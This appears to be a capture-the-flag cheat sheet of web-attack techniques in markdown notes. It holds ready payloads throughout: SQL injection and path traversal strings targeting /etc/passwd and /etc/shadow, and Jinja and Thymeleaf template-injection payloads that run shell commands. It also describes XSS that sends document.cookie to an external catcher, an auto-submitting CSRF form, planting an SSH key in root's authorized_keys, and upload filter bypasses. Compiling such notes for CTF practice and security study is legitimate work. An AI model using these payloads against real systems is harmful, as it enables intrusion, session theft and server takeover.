[BACK](../README.md)
# Web
- If we always receive a set-cookie in the header
  - if yes: That means it might not check for the expiration date of the cookie
- Inspect HTML
- Inspect JS
- Inspect Debug tab
- Inspect CSS
- Try directory listing 
  - ex: if we are in /instructions/instruction.html -> /instructions
- Search for /robots.txt
  - Needs to be at the root of the website
- If the server is apache, try /.htaccess
- If MacOS: try /.DS_Store
- humans.txt
- Change user agent
- Try every verb
- Check cookie
  - try to modify it
When prompted for a password:
  - Try switching request to put or post
- Try checking for /.git


## IP Spoofing
- Add X-Forwarded-For header with the IP you want to spoof

## Webpack
The map file is a file that maps the minified code to the original code
- If the map file is available, we can read the original code
- You can find it with the static js files. It will be named the same as the js file with a .map at the end
## SQL Injection

https://portswigger.net/web-security/sql-injection/cheat-sheet

```sql
' OR 1 = 1 UNION SELECT 1
```
If error:
- Try adding a limit to the amount of Rows
- Try adding more columns
- Check urlencoding

### sqlite3:
get tables:
```sql
' UNION SELECT name, type FROM sqlite_master WHERE type='table'--
```
## API
- Check OPTIONS verb
- Try every verb
- Check openAPI/SwaggerUI endpoint
- Try passing more fields in an "update" endpoint
- Try different version of api
  - ex if api uses /v2 try /v1
- Check Accept header

ex: If the user object is this: 
```json
{
    "username":"username",
    "status":"user"
}
```
and the update endpoint asks for this:
```json
{
    "username":"username"
}
```
Pass this:
```json
{
    "username":"username",
    "status":"admin"
}
```

## Path Traversal
Wordlist for ffuf:
  https://raw.githubusercontent.com/drtychai/wordlists/refs/heads/master/dirb/common.txt
Useful to check:
- admin.php
- login.php
- Add ~ at the end of the php files
    - Vim backup files are stored with the file name + ~
- Try //path
  - ex: localhost:8080//etc/passwd
    - This will be interpreted as /etc/passwd instead of $CWD/etc/passwd
- To get the current working directory:
  - /proc/self/cwd returns the program working directory
- /proc/self/cmdline returns the command line that was used to start the process
- /proc/self/exe returns the executable that was used to start the process
- /proc/version returns the version of the kernel
- /proc/mounts returns the mounted filesystems
- /proc/net/arp returns the ARP table
- /proc/net/tcp returns the TCP connections
- /proc/net/udp returns the UDP connections
- /etc/ssh/ssh_config
  - can contain useful information
- /etc/apache2/sites-enabled/000-default or /etc/apache2/sites-available/default
- if ../ is sanitized, try ....// or ....\/
- may need to double urlencode 
```
ex:
../../../etc/passwd
↓
%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
↓
%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
```
If we can upload and choose the file name:
- Add our public key to a user’s authorized_keys file (/root/.ssh/authorized_keys)
- If a certain extension is required, try adding a null byte (%00) at the end of the file name to bypass the extension check
  - ex: shell.php%00.jpg

### Interesting files to read:
- /etc/passwd
- /etc/shadow
- /etc/hosts
- /etc/nginx/nginx.conf
- /var/log/nginx/access.log
- /var/log/nginx/error.log
- /etc/apache2/apache2.conf
- /etc/apache2/sites-enabled/000-default.conf
- /etc/apache2/sites-available/default


## XSS

To try to intercept requests from the page:

https://beeceptor.com/

Can add link to img src, or change window.location to this and add "?flag=" + document.cookie

- Interesting to capture:
  - document.cookie
  - document.location
  - document.body.innerHTML

If we can add css we can use the payload in `tools/css-keylogger' to capture keystrokes

If we need to do a GET request without js, we can add an img src with the link we want to send the request to

If we need to do a POST request without js, we can add a form with the method set to POST and the action set to the link we want to send the request to (needs user/bot to click on it)


### Different Angular XSS payloads
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md

## Serverside Template Injection (SSTI):
### jinja
If we can a template from user input, we can inject code in the template
Python example:
```python
# In this case 356 is the index of subprocess.Popen in the list of subclasses
{{().__class__.__bases__[0].__subclasses__()[356](["/bin/cat","flag"], stdout=-1).communicate()}}
# loops and if are also possible :
{% for i in range(100) %}{%if i % 2 == 0 %}{{i}}{% endif %}{% endfor %}
# Variables are also possible
{% set a=self %}
{% set a=a.__init__ %}
```
Payloads: 
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
  - Useful to check if there is a filter on characters

### Thymeleaf
```html
<img th:src="@{${T(java.lang.Runtime).getRuntime().exec('cat /flag.txt')}}"></img>
```


## JWT

- https://jwt.io/
- https://github.com/lmammino/jwt-cracker
  - Needed for `crackjwt.sh`
```bash
crackjwt.sh [jwtToken]
```

For RSA signed tokens:

- Burpsuite JWT Editor extension
  - Create a RSA key
  - In the repeater on the request sent with the cookie
  - "Attack" button -> Embedded JWK


## Flask/Python web

if urllib.parse used with urlsplit:
- add `a:` in front of the scheme to break the split (scheme returned in the url)
- add a `?` after the scheme to break (url returned in query)
- same with `#` to return everthing in fragment 

### Flask session token:
- https://github.com/Paradoxis/Flask-Unsign
  - Needed for `crack_flask_token.sh` and `edit_flask_token.sh`
- https://www.kirsle.net/wizards/flask-session.cgi

```bash
crack_flask_token.sh [token]
```

```bash
edit_flask_token.sh [payload] [secret]
```

Flask can not check for the expiration date of the session token by default
We can resend an old session and it will count as valid

## CSRF

To recognize:

- Only protection is a Session cookie
- no headers with "CSRF"
- need to send a request we can't from our computer
  - ex: need admin cookie, need to reach separate service
Payload example:
```html
<iframe style="display:none" name="csrf-frame"></iframe>
    <form  id="csrf-form" target="csrf-frame" action="[LINK]" method="[METHOD]" enctype="[ENCODING_TYPE]">
      <input type="text" name="[FIELD_NAME]" value="[WANTED_VALUE]" />
      <input type="submit" value="Submit" />
    </form>
<script>document.getElementById("csrf-form").submit()</script>
```

https://security.love/CSRF-PoC-Genorator/

- If there is a CSRF token sent with the request:
  - Try removing it
  - Try switching one char
  - Try switching it with one from another request

- Try:
  - Open form bracket and not closing it
    - if there are buttons under, they will send the request in the form on click
## XSLT

https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20XSLT%20Processing%20Security%20and%20Server%20Side%20Request%20Forgeries%20-%20OWASP%20Switzerland%20Meeting%202015.pdf
Read file:
- document('[FILE_NAME]') (XSLT 1.0)
- unparsed_text('[FILE_NAME]') (XSLT 2.0)
- php:function('file_get_contents','[FILE_NAME]')
- php:function('opendir','[DIR]') -> php:function('readdir') * amount of files toread

## Mock Server/API:
https://beeceptor.com/

## File uplaod 
https://book.hacktricks.xyz/pentesting-web/file-upload
- Addd a %0a to the name of the file between the .png and .php
  - ex: test.png%0a.php

## Swagger endpoints:
- /swagger-ui/index.html
- /swagger
- /swagger-ui
- /docs
- /redoc
- /openapi.json

## PHP
- PHP sessions are stored in /tmp by default
  - if we have access to the server, we can read the session files and change our session token
- fonction sys_get_temp_dir() to get the system temp directory
- session_save_path() to get the session save path
- PHP after 7.40 automatically sanitizes arguments when passed in an array in proc_open
- PHP (at least up to v8):
  - if you send more input variables than the limit:
    - The extra variables are not processed
    - A warning is send back
      - That means the request can't change the header
      - That can be used to avoid CSP
## Proxy bypass
### Lighttpd
- A TE header converts a "Connection: close" to "Connection: close, te"
  - Gunicorn, for example, only closes a connection if it sees exactly "Connection: close"
  - Adding the TE header can bypass the deny clause of Lighttpd

## Polyglot files
- We can have files that work as multiple file types at the same time
  - PNG + PHP
    - image readers usually ignore data after IEND chunk
    - So we can add the data we want after the IEND chunk to have a valid PNG and a valid PHP file
  - JPG + PHP
    - Usually image readers will accept data in the exif metadata
    - We can use exiftool to add PHP code in the exif metadata
      - exiftool -Comment='<?php phpinfo(); ?>' image.jpg


## Springboot
- We can check if actuator endpoints are enabled
  - /actuator
  - /actuator/health
  - /actuator/env
  - /actuator/metrics
  - /actuator/loggers
  - /actuator/threaddump
  - /actuator/httptrace
  - /actuator/mappings
  - /actuator/configprops
  - /actuator/auditevents
  - /actuator/beans
- They can give useful information about the server and sometimes allow RCE

## Other
- To dump the content of a directory from a website: `wget -r -np -nH --cut-dirs=3 -R index.html http://hostname/aaa/bbb/ccc/ddd/`
- If we have command injection but can't easily exfiltrate the data, we can try to move the data in a file in the "public" directory. Then we can access it from the browser
- If () are blocked:  
```javascript
 `${console.log`test`}`
 //instead of
 console.log("test")
 ```